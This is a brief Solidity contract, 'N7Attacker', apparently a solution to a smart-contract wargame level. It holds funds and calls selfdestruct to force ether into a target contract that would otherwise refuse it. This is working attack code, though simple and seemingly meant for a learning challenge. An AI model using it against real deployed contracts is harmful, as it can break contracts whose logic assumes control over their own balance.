// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

contract N7Attacker {
    receive() external payable {}

    function attack(address payable targetAddress) external {
        selfdestruct(targetAddress);
    }
}